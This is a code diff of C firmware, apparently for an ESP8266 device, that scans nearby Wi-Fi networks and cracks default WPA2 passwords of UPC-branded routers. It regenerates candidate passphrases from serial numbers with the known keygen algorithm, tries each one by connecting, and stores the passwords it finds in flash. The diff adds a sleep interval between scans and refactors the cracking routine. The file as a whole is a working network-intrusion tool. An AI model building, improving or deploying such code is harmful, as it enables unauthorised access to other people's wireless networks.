@@ -103,6 +103,7 @@ enum {
     TARGETING,
     CONNECTING,
     DISCONNECTING,
+    SLEEPING,
 } state;
 
 size_t ap_timeouts;
@@ -218,6 +219,9 @@ static void free_job(crack_job_t * job){
 }
 
 static size_t total_aps_pwned = 0;
+#ifdef SCAN_INTERVAL
+size_t times_slept = 0;
+#endif
 
 ICACHE_FLASH_ATTR
 static void wifi(os_event_t *events){
@@ -226,13 +230,12 @@ static void wifi(os_event_t *events){
         case SCANNING:
             if(aps_found == MAX_APS){
                 // flush AP buffer (found passwords will be re-loaded from flash, jobs will be re-linked by their target id)
-                printf("Flushing AP buffer...\n");
+                /*printf("Flushing AP buffer...\n");*/
                 aps_found = 0;
                 memset(aps, 0x0, sizeof(aps));
             }
             size_t aps_targeted = 0;
-            size_t i;
-            for(i = 0; i < aps_found; i++){
+            for(size_t i = 0; i < aps_found; i++){
                 if(aps[i].job){
                     aps_targeted++;
                 }
@@ -245,6 +248,27 @@ static void wifi(os_event_t *events){
             state = TARGETING;
             wifi_station_scan(NULL, wifi_scan_cb);
             break;
+#ifdef SCAN_INTERVAL
+        case SLEEPING:
+            if(times_slept == 0){
+                printf("Sleeping %u seconds\n", SCAN_INTERVAL);
+                wifi_set_opmode_current(NULL_MODE);
+                wifi_fpm_set_sleep_type(LIGHT_SLEEP_T);
+                wifi_fpm_open();
+            }
+            wifi_fpm_do_sleep(1000); // 1ms
+            os_delay_us(1000); // 1ms
+            times_slept++;
+            if(times_slept == SCAN_INTERVAL*1000){
+                wifi_fpm_do_wakeup();
+                wifi_fpm_close();
+                wifi_set_opmode_current(STATION_MODE);
+                state = SCANNING;
+                times_slept = 0;
+            }
+            system_os_post(PRIO_WIFI, 0, 0 );
+            break;
+#endif
         case CONNECTING:
         case DISCONNECTING:
             if(ap_timeouts == MAX_TRIES){
@@ -310,7 +334,6 @@ static void wifi(os_event_t *events){
                         memcpy(aps[global_ap_to_test].password, aps[global_ap_to_test].job->candidate_passwords+(8*aps[global_ap_to_test].job->current_password), 8);
                         printf("Found valid password for %s: %s\n", aps[global_ap_to_test].essid, aps[global_ap_to_test].password);
                         save_password(global_ap_to_test);
-                        printf("Saved password to user flash\n");
                         os_timer_arm(&blink_timer, 50, 1);
                         delete_cracker_job(aps[global_ap_to_test].job);
                         free_job(aps[global_ap_to_test].job);
@@ -402,14 +425,17 @@ static void wifi_scan_cb(void* arg, STATUS status){
         state = CONNECTING;
         global_ap_to_test = ap_to_test;
     } else {
+        state = SCANNING;
         if(jobs_running){
             // blink once per second for 1 ap being cracked, twice for two ap's, etc
             os_timer_arm(&blink_timer, 1000/jobs_running, 1);
         } else {
-            GPIO_OUTPUT_SET(LED_PIN, LED_OFF);
             os_timer_disarm(&blink_timer);
+            GPIO_OUTPUT_SET(LED_PIN, LED_OFF);
+#ifdef SCAN_INTERVAL
+            state = SLEEPING;
+#endif
         }
-        state = SCANNING;
     }
     system_os_post(PRIO_WIFI, 0, 0 );
 }
@@ -517,7 +543,6 @@ void hash2pass(uint8_t *in_hash, char *out_pass)
 
 
 ICACHE_FLASH_ATTR
-inline
 uint32_t mangle(uint32_t *pp)
 {
 	uint32_t a, b;
@@ -538,35 +563,30 @@ uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
 }
 
 ICACHE_FLASH_ATTR
-inline
-void serial2pass(char* serial, char* pass){
-    uint8_t h1[16], h2[16];
-    uint32_t hv[4], w1, w2, i;
-    char tmpstr[17];
+void hash_md5(char* in, char* out){
     MD5_CTX ctx;
     MD5_Init(&ctx);
-    MD5_Update(&ctx, serial, strlen(serial));
-    MD5_Final(h1, &ctx);
+    MD5_Update(&ctx, in, strlen(in));
+    MD5_Final(out, &ctx);
+}
+
+ICACHE_FLASH_ATTR
+inline
+void serial2pass(char* serial, char* pass){
+    uint8_t hash[17] = {0}, i;
+    uint32_t hva[4], hvb[4];
+    hash_md5(serial, hash);
 
     for (i = 0; i < 4; i++) {
-        hv[i] = *(uint16_t *)(h1 + i*2);
+        hva[i] = *(uint16_t *)(hash + i*2);
+        hvb[i] = *(uint16_t *)(hash + 8 + i*2);
     }
 
-    w1 = mangle(hv);
+    os_sprintf(hash, "%08X%08X", mangle(hva), mangle(hvb));
 
-    for (i = 0; i < 4; i++) {
-        hv[i] = *(uint16_t *)(h1 + 8 + i*2);
-    }
+    hash_md5(hash, hash);
 
-    w2 = mangle(hv);
-
-    os_sprintf(tmpstr, "%08X%08X", w1, w2);
-
-    MD5_Init(&ctx);
-    MD5_Update(&ctx, tmpstr, strlen(tmpstr));
-    MD5_Final(h2, &ctx);
-
-    hash2pass(h2, pass);
+    hash2pass(hash, pass);
 }
 
 #define TESTED_PREFIXES 3
@@ -574,78 +594,76 @@ const char *prefix[TESTED_PREFIXES] = {"SAAP", "SAPP", "SBAP"};
 #define PASSWORD_SIZE 8
 
 __attribute((optimize("O3")))
-ICACHE_FLASH_ATTR
+//ICACHE_FLASH_ATTR
 static void crack(os_event_t *events){
-    if(!jobs_running){
-        return;
-    }
-    // inline upc_generate_ssid
-    const uint32_t essid_digits = (sum - (((sum * MAGIC2) >> 54) - (sum >> 31)) * 10000000);
-    if(++buf[2] == MAX2+1){
-        buf[2] = 0;
-        if(++buf[1] == (MAX1+1)){
-            buf[1] = 0;
-            printf("Cracking %u target(s)... %u/%u\n", jobs_running, buf[0], MAX0);
-            if(++buf[0] == (MAX0+1)){
-                buf[0] = 0;
+    if(jobs_running){
+        // inline upc_generate_ssid
+        const uint32_t essid_digits = (sum - (((sum * MAGIC2) >> 54) - (sum >> 31)) * 10000000);
+        if(++buf[2] == MAX2+1){
+            buf[2] = 0;
+            if(++buf[1] == (MAX1+1)){
+                buf[1] = 0;
+                printf("Cracking %u target(s)... %u/%u\n", jobs_running, buf[0], MAX0);
+                if(++buf[0] == (MAX0+1)){
+                    buf[0] = 0;
+                }
             }
+            sum = buf[0] * 2500000 + buf[1] * 6800 + MAGIC_24GHZ;
+        } else {
+            sum++;
         }
-        sum = buf[0] * 2500000 + buf[1] * 6800 + MAGIC_24GHZ;
-    } else {
-        sum++;
-    }
 
-    // check results
-    for(size_t jobs_idx = 0; jobs_idx < jobs_running; jobs_idx++){
-        crack_job_t * restrict job = jobs_running_queue[jobs_idx];
-        if(!job)
-            continue;
-
-        if(job->start_sum == sum){
-            printf("Finished generating passwords for target UPC%07d\n", job->target);
-            job->finished_cracking = true;
-            delete_cracker_job(job);
-            add_finished_job(job);
-            job = jobs_running_queue[jobs_idx];
+        // check results
+        for(size_t jobs_idx = 0; jobs_idx < jobs_running; jobs_idx++){
+            crack_job_t * restrict job = jobs_running_queue[jobs_idx];
             if(!job)
                 continue;
-        }
 
-        if (essid_digits != job->target)
-            continue;
+            if(job->start_sum == sum){
+                /*printf("Finished generating passwords for target UPC%07d\n", job->target);*/
+                job->finished_cracking = true;
+                delete_cracker_job(job);
+                add_finished_job(job);
+                job = jobs_running_queue[jobs_idx];
+                if(!job)
+                    continue;
+            }
 
-        const size_t required_size = PASSWORD_SIZE*(job->passwords_found+TESTED_PREFIXES);
-        job->candidate_passwords = (char*) os_realloc(job->candidate_passwords, required_size);
-        memset(job->candidate_passwords+(job->passwords_found*PASSWORD_SIZE), 0, TESTED_PREFIXES*PASSWORD_SIZE);
+            if (essid_digits != job->target)
+                continue;
 
-        // roll back state
-        uint32_t old_buf[3];
-        memcpy(old_buf, buf, sizeof(old_buf));
-        if(buf[2] == 0){
-            old_buf[2] = MAX2;
-            if(buf[1] == 0){
-                old_buf[1] = MAX1;
-                if(buf[0] == 0){
-                    old_buf[0] = MAX0;
+            const size_t required_size = PASSWORD_SIZE*(job->passwords_found+TESTED_PREFIXES);
+            job->candidate_passwords = (char*) os_realloc(job->candidate_passwords, required_size);
+            memset(job->candidate_passwords+(job->passwords_found*PASSWORD_SIZE), 0, TESTED_PREFIXES*PASSWORD_SIZE);
+
+            // roll back state
+            uint32_t old_buf[3];
+            memcpy(old_buf, buf, sizeof(old_buf));
+            if(buf[2] == 0){
+                old_buf[2] = MAX2;
+                if(buf[1] == 0){
+                    old_buf[1] = MAX1;
+                    if(buf[0] == 0){
+                        old_buf[0] = MAX0;
+                    } else {
+                        old_buf[0] = buf[0]-1;
+                    }
                 } else {
-                    old_buf[0] = buf[0]-1;
+                    old_buf[1] = buf[1]-1;
                 }
             } else {
-                old_buf[1] = buf[1]-1;
+                old_buf[2] = buf[2]-1;
             }
-        } else {
-            old_buf[2] = buf[2]-1;
-        }
 
-        for(size_t prefix_idx = 0; prefix_idx < TESTED_PREFIXES; prefix_idx++){
-            char serial[13] = {0};
-            char * pass = job->candidate_passwords+(PASSWORD_SIZE*(job->passwords_found));
-            os_sprintf(serial, "%s%d%03d%04d", prefix[prefix_idx], old_buf[0], old_buf[1], old_buf[2]);
-            serial2pass(serial, pass);
-            //printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
-            job->passwords_found++;
+            for(size_t prefix_idx = 0; prefix_idx < TESTED_PREFIXES; prefix_idx++){
+                char serial[13] = {0};
+                char * pass = job->candidate_passwords+(PASSWORD_SIZE*(job->passwords_found));
+                os_sprintf(serial, "%s%d%03d%04d", prefix[prefix_idx], old_buf[0], old_buf[1], old_buf[2]);
+                serial2pass(serial, pass);
+                //printf("  -> WPA2 phrase for '%s' = '%s'\n", serial, pass);
+                job->passwords_found++;
+            }
         }
+        system_os_post(PRIO_CRACK, 0, 0);
     }
-
-    system_os_post(PRIO_CRACK, 0, 0);
 }
